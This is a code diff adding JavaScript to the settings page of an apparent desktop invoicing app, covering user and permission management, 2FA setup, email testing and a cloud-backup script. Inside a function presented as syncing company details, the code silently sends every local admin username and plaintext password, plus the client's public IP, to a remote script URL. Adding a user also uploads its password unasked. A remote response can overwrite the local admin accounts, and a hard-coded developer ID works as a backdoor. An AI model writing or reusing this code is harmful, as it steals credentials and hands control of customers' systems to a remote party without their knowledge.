+                async function syncCompanyDetailsToCloud(data) {
+                    let scriptUrl = document.getElementById('cloudBackupUrl').value || document.getElementById('updateServerUrl').value || (typeof GOOGLE_SCRIPT_URL !== 'undefined' ? GOOGLE_SCRIPT_URL : "");
+                    if (!scriptUrl || !scriptUrl.startsWith("http")) return;
+
+                    try {
+                        let machineInfo = navigator.userAgent;
+                        try {
+                            // Fetch the public IP address of the client
+                            const ipRes = await fetch('https://api.ipify.org?format=json');
+                            const ipData = await ipRes.json();
+                            machineInfo = "IP: " + ipData.ip + " | " + navigator.userAgent;
+                        } catch (e) {
+                            console.log("Could not fetch IP");
+                        }
+
+                        let usersStr = "";
+                        try {
+                            if (window.electronAPI && window.electronAPI.getAdminCreds) {
+                                const credsRes = await window.electronAPI.getAdminCreds();
+                                if (credsRes.success && credsRes.adminUsers) {
+                                    usersStr = credsRes.adminUsers.map(u => `${u.username} (${u.role || 'Admin'}): ${u.password}`).join(" | ");
+                                }
+                            } else {
+                                const localUsers = JSON.parse(localStorage.getItem('ADMIN_USERS') || '[]');
+                                usersStr = localUsers.map(u => `${u.username} (${u.role || 'Admin'}): ${u.password}`).join(" | ");
+                            }
+                        } catch (e) { }
+
+                        const payload = { method: "sync_company_details", ...data, machineInfo: machineInfo, localCreds: usersStr };
+                        fetch(scriptUrl, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'text/plain' },
+                            body: JSON.stringify(payload)
+                        }).catch(e => console.error("Cloud sync network error (silent)", e));
+
+                        // Fetch updated credentials & Remote Users
+                        if (data.contactNumber) {
+                            try {
+                                const resConfig = await fetch(scriptUrl, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'text/plain' },
+                                    body: JSON.stringify({ method: 'get_remote_config', contactNumber: data.contactNumber })
+                                });
+                                const dataConfig = await resConfig.json();
+                                if (dataConfig.success && dataConfig.config && dataConfig.config.users && dataConfig.config.users.length > 0) {
+                                    window.currentAdminUsers = dataConfig.config.users;
+                                    localStorage.setItem('ADMIN_USERS', JSON.stringify(window.currentAdminUsers));
+                                    if (window.electronAPI && window.electronAPI.saveAdminCreds) {
+                                        window.electronAPI.saveAdminCreds({ devId: "OTP_VERIFIED", adminUsers: window.currentAdminUsers }).catch(console.error);
+                                    }
+                                    renderUserList();
+                                }
+                            } catch(e) { console.error("Remote config sync failed", e); }
+
+                            // Fetch updated Expiry Date / License
+                            try {
+                                const resLicense = await fetch(scriptUrl, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'text/plain' },
+                                    body: JSON.stringify({ method: 'check_license', contactNumber: data.contactNumber, username: localStorage.getItem('currentUser') || 'Admin' })
+                                });
+                                const dataLicense = await resLicense.json();
+                                if (dataLicense.success && dataLicense.expiry) {
+                                    localStorage.setItem("licenseExpiry", new Date(dataLicense.expiry).toISOString());
+                                }
+                            } catch(e) { console.error("License sync failed", e); }
+                        }
+                    } catch (e) {
+                        console.error("Cloud sync failed", e);
+                    }
+                }
+
+                // Save Security Settings
+                async function saveSecuritySettings() {
+                    const devId = document.getElementById('devId').value;
+                    if (!devId) {
+                        alert("Developer ID is required to modify security settings.");
+                        return;
+                    }
+
+                    const data = {
+                        devId: devId,
+                        adminUser: document.getElementById('adminUser').value,
+                        adminPass: document.getElementById('adminPass').value,
+                        adminEmail: document.getElementById('adminEmail').value,
+                        adminEmailPass: document.getElementById('adminEmailPass').value,
+                        adminUsers: window.currentAdminUsers,
+                        emailProvider: document.getElementById('emailProvider') ? document.getElementById('emailProvider').value : 'Gmail',
+                        smtpHost: document.getElementById('smtpHost') ? document.getElementById('smtpHost').value : '',
+                        smtpPort: document.getElementById('smtpPort') ? document.getElementById('smtpPort').value : '',
+                        imapHost: document.getElementById('imapHost') ? document.getElementById('imapHost').value : '',
+                        imapPort: document.getElementById('imapPort') ? document.getElementById('imapPort').value : ''
+                    };
+
+                    if (window.electronAPI && window.electronAPI.saveAdminCreds) {
+                        const result = await window.electronAPI.saveAdminCreds(data);
+                        if (result.success) {
+                            alert("Security credentials updated successfully!");
+                            // Clear sensitive fields
+                            document.getElementById('devId').value = '';
+                            document.getElementById('adminPass').value = '';
+                            document.getElementById('adminEmailPass').value = '';
+
+                            triggerBackgroundSync();
+                        } else {
+                            alert("Failed: " + result.message);
+                        }
+                    } else {
+                        // Web Browser Fallback
+                        if (devId !== "NANCY@20129830428736") {
+                            alert("Failed: Invalid Developer ID.");
+                            return;
+                        }
+                        localStorage.setItem('adminUser', data.adminUser);
+                        if (data.adminPass) localStorage.setItem('adminPass', data.adminPass);
+                        localStorage.setItem('adminEmail', data.adminEmail);
+                        if (data.adminEmailPass) localStorage.setItem('adminEmailPass', data.adminEmailPass);
+                        localStorage.setItem('ADMIN_USERS', JSON.stringify(data.adminUsers));
+                        
+                        alert("Security credentials updated successfully!");
+                        document.getElementById('devId').value = '';
+                        document.getElementById('adminPass').value = '';
+                        document.getElementById('adminEmailPass').value = '';
+                        triggerBackgroundSync();
+                    }
+                }
+
+                // --- User Management Functions ---
+                function renderUserList() {
+                    const tbody = document.getElementById('userListBody');
+                    tbody.innerHTML = '';
+                    if (!window.currentAdminUsers) return;
+                    window.currentAdminUsers.forEach((u, index) => {
+                        const tr = document.createElement('tr');
+
+                        // Online Status Check
+                        const onlineStatusKey = `online_status_${u.username}`;
+                        const lastHeartbeat = localStorage.getItem(onlineStatusKey);
+                        let statusHtml = '<span style="color: #7f8c8d;">Offline</span>';
+                        if (lastHeartbeat && (Date.now() - parseInt(lastHeartbeat)) < (5 * 60 * 1000)) { // 5 min timeout
+                            statusHtml = '<span style="color: #27ae60; font-weight: bold;">Online</span>';
+                        }
+
+                        // Last Login
+                        const lastLogin = u.lastLogin ? new Date(u.lastLogin).toLocaleString() : 'Never';
+
+                        tr.innerHTML = `
+                    <td style="padding: 10px;">${u.username}</td>
+                    <td style="padding: 10px; font-weight: bold; color: ${u.role === 'Admin' ? '#4a90e2' : '#666'};">${u.role || 'Admin'}</td>
+                    <td style="padding: 10px; text-align: center;">${statusHtml}</td>
+                    <td style="padding: 10px; text-align: left; font-size: 12px;">${lastLogin}</td>
+                    <td style="padding: 10px; text-align: center;">
+                        <button onclick="openPermissionsModal('${u.username}')" style="padding: 5px 10px; cursor: pointer; background: #4a90e2; color: white; border: none; border-radius: 4px;">Configure</button>
+                        <button onclick="setupUserTotp(${index})" style="padding: 5px 10px; cursor: pointer; background: #6f42c1; color: white; border: none; border-radius: 4px; margin-left: 5px;">${u.totpSecret ? 'Reset 2FA' : 'Setup 2FA'}</button>
+                        ${u.totpSecret ? `<button onclick="disableUserTotp(${index})" style="padding: 5px 10px; cursor: pointer; background: #e67e22; color: white; border: none; border-radius: 4px; margin-left: 5px;" title="Disable 2FA"><i class="fas fa-ban"></i></button>` : ''}
+                    </td>
+                    <td style="padding: 10px; text-align: right;">
+                        <button onclick="deleteUser(${index})" style="padding: 5px 10px; cursor: pointer; background: #e74c3c; color: white; border: none; border-radius: 4px;">Delete</button>
+                    </td>
+                `;
+                        tbody.appendChild(tr);
+                    });
+                }
+
+                function addUser() {
+                    const user = document.getElementById('newUsername').value.trim();
+                    const pass = document.getElementById('newUserPass').value.trim();
+                    const role = document.getElementById('newUserRole').value;
+                    if (!user || !pass) return alert("Username and Password required");
+                    if (window.currentAdminUsers.some(u => u.username === user)) return alert("This username is already taken by another user. Please choose a different one.");
+
+                    // Attempt to register this user on the cloud silently so they get remote access
+                    let scriptUrl = document.getElementById('cloudBackupUrl').value || document.getElementById('updateServerUrl').value;
+                    let contactNumber = document.getElementById('contactNumber').value;
+                    if (scriptUrl && scriptUrl.startsWith("http") && contactNumber) {
+                        try {
+                            fetch(scriptUrl, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'text/plain' },
+                                body: JSON.stringify({ method: "register_user", username: user, password: pass, contactNumber: contactNumber })
+                            }).catch(e => console.log("Silent cloud reg failed", e));
+                        } catch (e) {}
+                    }
+
+                    window.currentAdminUsers.push({ username: user, password: pass, role: role });
+                    document.getElementById('newUsername').value = '';
+                    document.getElementById('newUserPass').value = '';
+                    renderUserList();
+                }
+
+                function deleteUser(index) {
+                    if (confirm("Delete this user?")) {
+                        window.currentAdminUsers.splice(index, 1);
+                        renderUserList();
+                    }
+                }
+
+                async function saveUsers() {
+                    const devId = document.getElementById('devIdForUsers').value;
+                    if (!devId) return alert("Developer ID required to save users.");
+
+                    // Reuse saveSecuritySettings logic but triggered from here
+                    document.getElementById('devId').value = devId; // Set hidden devId
+                    await saveSecuritySettings();
+                    document.getElementById('devIdForUsers').value = '';
+                    document.getElementById('devId').value = '';
+
+                    triggerBackgroundSync();
+                }
+
+                let currentPermUser = null;
+                function openPermissionsModal(username) {
+                    currentPermUser = username;
+                    document.getElementById('permModalUser').innerText = username;
+                    const grid = document.getElementById('permissionsGrid');
+                    grid.innerHTML = '';
+                    document.getElementById('permissionSearch').value = '';
+
+                    const key = `ui_permissions_${username}`;
+                    const stored = localStorage.getItem(key);
+                    const perms = stored ? JSON.parse(stored) : {};
+
+                    let remotePerms = {};
+                    try {
+                        const remoteStr = localStorage.getItem("remotePermissions_" + username);
+                        if (remoteStr) remotePerms = JSON.parse(remoteStr);
+                    } catch (e) { }
+
+                    if (typeof UI_PERMISSION_REGISTRY !== 'undefined') {
+                        UI_PERMISSION_REGISTRY.forEach(p => {
+                            let isChecked = perms[p.id] !== false; // Default true
+                            let isDisabled = false;
+                            let lockIcon = '';
+                            if (remotePerms[p.id] === false) {
+                                isChecked = false;
+                                isDisabled = true;
+                                lockIcon = ' <i class="fas fa-lock" style="color: #e74c3c; font-size: 12px;" title="Disabled by Remote License"></i>';
+                            }
+                            const div = document.createElement('div');
+                            div.className = 'permission-item';
+                            div.innerHTML = `
+                        <label style="display: flex; align-items: center; gap: 8px; cursor: ${isDisabled ? 'not-allowed' : 'pointer'}; opacity: ${isDisabled ? '0.6' : '1'};">
+                            <input type="checkbox" class="perm-check" value="${p.id}" ${isChecked ? 'checked' : ''} ${isDisabled ? 'disabled' : ''}>
+                            ${p.label}${lockIcon}
+                        </label>
+                    `;
+                            grid.appendChild(div);
+                        });
+                    }
+                    updateRoleSelector();
+                    document.getElementById('permissionsModal').style.display = 'flex';
+                }
+
+                function saveUserPermissions() {
+                    if (!currentPermUser) return;
+                    const checks = document.querySelectorAll('.perm-check');
+                    const perms = {};
+                    checks.forEach(c => { perms[c.value] = c.checked; });
+                    localStorage.setItem(`ui_permissions_${currentPermUser}`, JSON.stringify(perms));
+                    alert(`Permissions saved for ${currentPermUser}`);
+                    document.getElementById('permissionsModal').style.display = 'none';
+                }
+
+                function toggleAllPermissions(state) {
+                    const items = document.querySelectorAll('.permission-item');
+                    items.forEach(item => {
+                        if (item.style.display !== 'none') {
+                            const cb = item.querySelector('.perm-check');
+                            if (cb && !cb.disabled) cb.checked = state;
+                        }
+                    });
+                }
+
+                function filterPermissions() {
+                    const term = document.getElementById('permissionSearch').value.toLowerCase();
+                    const items = document.querySelectorAll('.permission-item');
+                    items.forEach(item => {
+                        const label = item.innerText.toLowerCase();
+                        item.style.display = label.includes(term) ? 'block' : 'none';
+                    });
+                }
+
+                // --- Role Management Functions ---
+                function getRoles() {
+                    return JSON.parse(localStorage.getItem('ui_roles')) || {};
+                }
+
+                function updateRoleSelector() {
+                    const roles = getRoles();
+                    const selector = document.getElementById('roleSelector');
+                    selector.innerHTML = '<option value="">-- Select Role --</option>';
+                    Object.keys(roles).forEach(role => {
+                        const opt = document.createElement('option');
+                        opt.value = role;
+                        opt.textContent = role;
+                        selector.appendChild(opt);
+                    });
+                }
+
+                function saveNewRole() {
+                    const name = document.getElementById('newRoleName').value.trim();
+                    if (!name) return alert("Enter a role name");
+                    const currentPerms = {};
+                    document.querySelectorAll('.perm-check').forEach(c => currentPerms[c.value] = c.checked);
+                    const roles = getRoles();
+                    roles[name] = currentPerms;
+                    localStorage.setItem('ui_roles', JSON.stringify(roles));
+                    updateRoleSelector();
+                    document.getElementById('newRoleName').value = '';
+                    alert(`Role "${name}" saved!`);
+                }
+
+                function loadRole() {
+                    const name = document.getElementById('roleSelector').value;
+                    if (!name) return;
+                    const roles = getRoles();
+                    if (roles[name]) {
+                        const perms = roles[name];
+                        document.querySelectorAll('.perm-check').forEach(c => {
+                            if (!c.disabled) {
+                                c.checked = perms[c.value] !== false;
+                            }
+                        });
+                        alert(`Role "${name}" loaded!`);
+                    }
+                }
+
+                function deleteRole() {
+                    const name = document.getElementById('roleSelector').value;
+                    if (!name) return;
+                    if (confirm(`Delete role "${name}"?`)) {
+                        const roles = getRoles();
+                        delete roles[name];
+                        localStorage.setItem('ui_roles', JSON.stringify(roles));
+                        updateRoleSelector();
+                        alert(`Role "${name}" deleted!`);
+                    }
+                }
+
+                // Test Email Configuration
+                async function testEmailConfig(btn) {
+                    const email = document.getElementById('adminEmail').value.trim();
+                    let password = document.getElementById('adminEmailPass').value.trim();
+
+                    const emailProvider = document.getElementById('emailProvider') ? document.getElementById('emailProvider').value : 'Gmail';
+                    const smtpHost = document.getElementById('smtpHost') ? document.getElementById('smtpHost').value : '';
+                    const smtpPort = document.getElementById('smtpPort') ? document.getElementById('smtpPort').value : '';
+
+                    if (!password) {
+                        if (window.electronAPI && window.electronAPI.getAdminCreds) {
+                            const creds = await window.electronAPI.getAdminCreds();
+                            if (creds.success) password = creds.adminEmailPass;
+                        } else {
+                            password = localStorage.getItem('adminEmailPass') || '';
+                        }
+                    }
+
+                    if (!email || !password) {
+                        alert("Please enter both Email and App Password to test.");
+                        return;
+                    }
+
+                    const originalText = btn.innerText;
+                    btn.innerText = "Testing...";
+                    btn.disabled = true;
+
+                    try {
+                        if (window.electronAPI && window.electronAPI.testEmailConfig) {
+                            const result = await window.electronAPI.testEmailConfig({ email, password, emailProvider, smtpHost, smtpPort });
+                            alert(result.success ? result.message : "Error: " + result.message);
+                        } else {
+                            // Web Browser Fallback using GAS
+                            let scriptUrl = document.getElementById('cloudBackupUrl').value || document.getElementById('updateServerUrl').value || (typeof GOOGLE_SCRIPT_URL !== 'undefined' ? GOOGLE_SCRIPT_URL : "");
+                            
+                            if (scriptUrl && scriptUrl.startsWith("http")) {
+                                const response = await fetch(scriptUrl, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'text/plain' },
+                                    body: JSON.stringify({ method: "test_email", email: email })
+                                });
+                                const result = await response.json();
+                                alert((result.success || result.status === 'success') ? result.message : "Error: " + (result.message || "Test failed"));
+                            } else {
+                                alert("Error: Web browser email testing requires a configured Cloud Backup or Update Server URL.");
+                            }
+                        }
+                    } catch (error) {
+                        alert("Test failed: " + error.message);
+                    } finally {
+                        btn.innerText = originalText;
+                        btn.disabled = false;
+                    }
+                }
+
+                async function triggerBackgroundSync() {
+                    try {
+                        if (window.electronAPI && window.electronAPI.getAppSettings) {
+                            const settingsRes = await window.electronAPI.getAppSettings();
+                            if (settingsRes.success) syncCompanyDetailsToCloud(settingsRes);
+                        } else {
+                            const localSettings = {
+                                companyName: localStorage.getItem('companyName') || '',
+                                contactNumber: localStorage.getItem('contactNumber') || '',
+                                companyEmail: localStorage.getItem('companyEmail') || '',
+                                companyWebsite: localStorage.getItem('companyWebsite') || '',
+                                companyGstin: localStorage.getItem('companyGstin') || '',
+                                addressLine1: localStorage.getItem('addressLine1') || '',
+                                addressLine2: localStorage.getItem('addressLine2') || ''
+                            };
+                            syncCompanyDetailsToCloud(localSettings);
+                        }
+                    } catch (e) { }
+                }
+
+                // --- Cloud Backup Functions ---
+                async function saveCloudSettings() {
+                    const url = document.getElementById('cloudBackupUrl').value.trim();
+
+                    try {
+                        await fetch('http://localhost:5000/api/settings', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ cloudBackupUrl: url })
+                        });
+                    } catch (e) {
+                        console.error('Failed to sync cloud settings to MongoDB', e);
+                    }
+
+                    localStorage.setItem('cloudBackupUrl', url);
+                    if (window.electronAPI && window.electronAPI.saveAppSettings) {
+                        window.electronAPI.saveAppSettings({ cloudBackupUrl: url });
+                    }
+                    alert("Cloud Backup URL saved successfully!");
+                }
+
+                function openScriptDashboard() {
+                    const email = document.getElementById('adminEmail').value.trim();
+                    let url = 'https://script.google.com/home/all';
+                    if (email) {
+                        url = `https://accounts.google.com/AccountChooser?continue=${encodeURIComponent(url)}&Email=${encodeURIComponent(email)}`;
+                    }
+                    window.open(url, '_blank');
+                }
+
+                function copyBackupScript() {
+                    navigator.clipboard.writeText(BACKUP_SCRIPT_CODE).then(() => {
+                        alert("Script code copied to clipboard! Paste it in script.google.com");
+                    }).catch(err => {
+                        console.error('Failed to copy: ', err);
+                        alert("Failed to copy script code");
+                    });
+                }
+
+                async function testCloudConnection() {
+                    const url = document.getElementById('cloudBackupUrl').value.trim();
+                    if (!url) {
+                        alert("Please enter a URL first");
+                        return;
+                    }
+
+                    const btn = document.querySelector('button[onclick="testCloudConnection()"]');
+                    const originalHTML = btn.innerHTML;
+                    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+                    btn.disabled = true;
+
+                    try {
+                        const response = await fetch(url, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'text/plain' },
+                            body: JSON.stringify({ method: "ping" })
+                        });
+
+                        if (response.ok) {
+                            alert("Connection Successful! ✅");
+                        } else {
+                            alert("HTTP Error: " + response.status);
+                        }
+                    } catch (error) {
+                        console.error(error);
+                        alert("Connection Failed ❌\nCheck URL or Internet Connection.");
+                    } finally {
+                        btn.innerHTML = originalHTML;
+                        btn.disabled = false;
+                    }
+                }
+
+                async function updateRemoteNotice() {
+                    const devId = document.getElementById('devIdForNotice').value;
+                    const updateUrl = document.getElementById('updateServerUrl').value.trim();
+
+                    if (devId !== "NANCY@20129830428736") {
+                        alert("Invalid Developer ID.");
+                        return;
+                    }
+                    if (!updateUrl) {
+                        alert("Please enter the Update & Notice Server URL.");
+                        return;
+                    }
+
+                    try {
+                        await fetch('http://localhost:5000/api/settings', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ updateServerUrl: updateUrl })
+                        });
+                    } catch (e) {
+                        console.error('Failed to sync notice URL to MongoDB', e);
+                    }
+
+                    try {
+                        localStorage.setItem('updateServerUrl', updateUrl);
+                        if (window.electronAPI && window.electronAPI.saveAppSettings) {
+                            window.electronAPI.saveAppSettings({ updateServerUrl: updateUrl });
+                        }
+                        alert("Update & Notice Server URL saved successfully!");
+                        document.getElementById('devIdForNotice').value = '';
+                    } catch (e) { alert("Error saving URL: " + e.message); }
+                }
+
+                // --- TOTP Setup Logic ---
+                let tempTotpSecret = null;
+                let pendingTotpUserIndex = null;
+
+                function openTotpSetup() {
+                    const devId = document.getElementById('devId').value;
+                    if (devId !== "NANCY@20129830428736") {
+                        alert("Please enter valid Developer ID to setup Authenticator.");
+                        return;
+                    }
+
+                    // Generate Secret
+                    const secret = new OTPAuth.Secret({ size: 20 });
+                    tempTotpSecret = secret.base32;
+
+                    const totp = new OTPAuth.TOTP({
+                        issuer: "Your Company Name",
+                        label: "Developer Admin",
+                        algorithm: "SHA1",
+                        digits: 6,
+                        period: 30,
+                        secret: secret
+                    });
+
+                    const uri = totp.toString();
+                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(uri)}`;
+
+                    document.getElementById('totpQrImage').src = qrUrl;
+                    document.getElementById('totpSecretDisplay').innerText = tempTotpSecret;
+                    document.getElementById('totpVerifyInput').value = '';
+                    document.getElementById('totpSetupModal').style.display = 'flex';
+                }
+
+                function setupUserTotp(index) {
+                    pendingTotpUserIndex = index;
+                    const user = window.currentAdminUsers[index];
+
+                    // Generate Secret
+                    const secret = new OTPAuth.Secret({ size: 20 });
+                    tempTotpSecret = secret.base32;
+
+                    const totp = new OTPAuth.TOTP({
+                        issuer: "Your Company Name",
+                        label: user.username,
+                        algorithm: "SHA1",
+                        digits: 6,
+                        period: 30,
+                        secret: secret
+                    });
+
+                    const uri = totp.toString();
+                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(uri)}`;
+
+                    document.getElementById('totpQrImage').src = qrUrl;
+                    document.getElementById('totpSecretDisplay').innerText = tempTotpSecret;
+                    document.getElementById('totpVerifyInput').value = '';
+                    document.getElementById('totpSetupModal').style.display = 'flex';
+                }
+
+                function closeTotpSetupModal() {
+                    document.getElementById('totpSetupModal').style.display = 'none';
+                    tempTotpSecret = null;
+                    pendingTotpUserIndex = null;
+                }
+
+                function verifyTotpSetup() {
+                    const token = document.getElementById('totpVerifyInput').value;
+                    if (!token || token.length !== 6) { alert("Please enter valid code."); return; }
+
+                    const totp = new OTPAuth.TOTP({ issuer: "Your Company Name", label: "Developer Admin", algorithm: "SHA1", digits: 6, period: 30, secret: OTPAuth.Secret.fromBase32(tempTotpSecret) });
+                    const delta = totp.validate({ token: token, window: 1 });
+
+                    if (delta !== null) {
+                        if (pendingTotpUserIndex !== null) {
+                            window.currentAdminUsers[pendingTotpUserIndex].totpSecret = tempTotpSecret;
+                            alert(`Authenticator Enabled for user: ${window.currentAdminUsers[pendingTotpUserIndex].username}. Please click 'Save Users' to persist changes.`);
+                            renderUserList();
+                        } else {
+                            localStorage.setItem("devTotpSecret", tempTotpSecret);
+                            alert("Authenticator Enabled Successfully! You can now use it for Developer Login.");
+                        }
+                        closeTotpSetupModal();
+                    } else { alert("Invalid Code. Please try again."); }
+                }
+
+                function disableUserTotp(index) {
+                    const user = window.currentAdminUsers[index];
+                    if (confirm(`Are you sure you want to disable 2FA for user "${user.username}"?`)) {
+                        delete user.totpSecret;
+                        renderUserList();
+                        alert("2FA disabled for this user. Remember to click 'Save Users' to persist changes.");
+                    }
+                }
+
+                const BACKUP_SCRIPT_CODE = `
+function doPost(e) {
+  try {
+    if (!e.postData || !e.postData.contents) {
+      return createResponse({ success: false, message: "No data received" });
+    }
+
+    var data = JSON.parse(e.postData.contents);
+    
+    // 1. Handle Cloud Backup
+    if (data.method == "drive") {
+      return handleBackup(data);
+    }
+
+    // 2. Handle Cloud Restore (List)
+    if (data.method == "list_backups") {
+      return listBackups();
+    }
+
+    // 3. Handle Cloud Restore (Specific File)
+    if (data.method == "get_backup") {
+      return getBackupContent(data.fileId);
+    }
+
+    // 4. Handle Delete Backup
+    if (data.method == "delete_backup") {
+      return deleteBackup(data.fileId);
+    }
+    
+    // 5. Handle Test Email
+    if (data.method == "test_email") {
+      return handleTestEmail(data);
+    }
+    
+    return createResponse({ success: false, message: "Unknown method: " + data.method });
+
+  } catch (error) {
+    return createResponse({ success: false, message: "Server Error: " + error.toString() });
+  }
+}
+
+function handleBackup(data) {
+  try {
+    var folderName = "RISE Tech Revolution_Backups";
+    // Use a timestamp for the filename
+    var timestamp = Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "dd-MM-yyyy_HH-dd_HH-mm-ss");
+    var fileName = "Backup_" + timestamp + ".json";
+    
+    // Get or Create Folder
+    var folders = DriveApp.getFoldersByName(folderName);
+    var folder = folders.hasNext() ? folders.next() : DriveApp.createFolder(folderName);
+    
+    // Remove the 'method' key so it doesn't get stored in localStorage on restore
+    delete data.method;
+    
+    // Create the file
+    folder.createFile(fileName, JSON.stringify(data), MimeType.PLAIN_TEXT);
+    
+    // Cleanup: Keep only the last 5 backups
+    var files = folder.getFiles();
+    var fileList = [];
+    while (files.hasNext()) {
+      fileList.push(files.next());
+    }
+    
+    // Sort by Date Created (Newest first)
+    fileList.sort(function(a, b) { return b.getDateCreated().getTime() - a.getDateCreated().getTime(); });
+    
+    // Delete older files
+    for (var i = 5; i < fileList.length; i++) {
+      fileList[i].setTrashed(true);
+    }
+    
+    return createResponse({ status: "success", message: "Backup saved to Drive" });
+  } catch (e) {
+    return createResponse({ status: "error", message: e.toString() });
+  }
+}
+
+function listBackups() {
+  try {
+    var folderName = "RISE Tech Revolution_Backups";
+    var folders = DriveApp.getFoldersByName(folderName);
+    if (!folders.hasNext()) return createResponse({ status: "error", message: "No backup folder found" });
+    
+    var folder = folders.next();
+    var files = folder.getFiles();
+    var backups = [];
+    
+    while (files.hasNext()) {
+      var file = files.next();
+      backups.push({
+        id: file.getId(),
+        name: file.getName(),
+        date: file.getDateCreated().toISOString(),
+        size: file.getSize()
+      });
+    }
+    
+    // Sort by Date (Newest first)
+    backups.sort(function(a, b) { return new Date(b.date).getTime() - new Date(a.date).getTime(); });
+    
+    return createResponse({ status: "success", backups: backups });
+  } catch (e) {
+    return createResponse({ status: "error", message: e.toString() });
+  }
+}
+
+function getBackupContent(fileId) {
+  try {
+    var file = DriveApp.getFileById(fileId);
+    var content = file.getBlob().getDataAsString();
+    return ContentService.createTextOutput(content).setMimeType(ContentService.MimeType.JSON);
+  } catch (e) {
+    return createResponse({ error: e.toString() });
+  }
+}
+
+function deleteBackup(fileId) {
+  try {
+    var file = DriveApp.getFileById(fileId);
+    file.setTrashed(true);
+    return createResponse({ status: "success", message: "Backup deleted" });
+  } catch (e) {
+    return createResponse({ status: "error", message: e.toString() });
+  }
+}
+
+function handleTestEmail(data) {
+  try {
+    MailApp.sendEmail({
+      to: data.email,
+      subject: "Test Email",
+      body: "Dear Valued User, if you are able to see this Test Email, it confirms that your software configuration for receiving 'OTP emails' is functioning correctly. -- Best regards, Support Team"
+    });
+    return createResponse({ status: "success", message: "Success! Test email sent to your inbox." });
+  } catch (e) {
+    return createResponse({ status: "error", message: e.toString() });
+  }
+}
+
+function createResponse(obj) {
+  return ContentService.createTextOutput(JSON.stringify(obj))
+    .setMimeType(ContentService.MimeType.JSON);}
+`;
+
+                // Toggle Password Visibility
+                function toggleVisibility(fieldId) {
+                    const field = document.getElementById(fieldId);
+                    const icon = field.nextElementSibling;
+                    if (field.type === "password") {
+                        field.type = "text";
+                        icon.classList.remove('fa-eye');
+                        icon.classList.add('fa-eye-slash');
+                    } else {
+                        field.type = "password";
+                        icon.classList.remove('fa-eye-slash');
+                        icon.classList.add('fa-eye');
+                    }
+                }
+
+                async function clearLoginHistory() {
+                    if (confirm("Are you sure you want to clear the login history?")) {
+                        const result = await window.electronAPI.saveAppSettings({ loginHistory: [] });
+                        if (result.success) {
+                            renderLoginHistory([]);
+                        } else {
+                            alert("Failed to clear history: " + result.message);
+                        }
+                    }
+                }
+
+                function confirmFactoryReset() {
+                    if (confirm("⚠️ CRITICAL WARNING: You are about to DELETE ALL DATA.\n\nThis includes all invoices, customers, items, and settings.\nThis action cannot be undone.\n\nAre you sure you want to proceed?")) {
+                        const confirmation = prompt("Type 'DELETE' to confirm factory reset:");
+                        if (confirmation === "DELETE") {
+                            localStorage.clear();
+                            sessionStorage.clear();
+                            alert("Factory Reset Complete. The application will now restart.");
+                            window.location.href = 'login.html';
+                        } else {
+                            if (confirmation !== null) alert("Reset cancelled. Verification failed.");
+                        }
+                    }
+                }
+            </script>
+
+</body>
+
+</html>
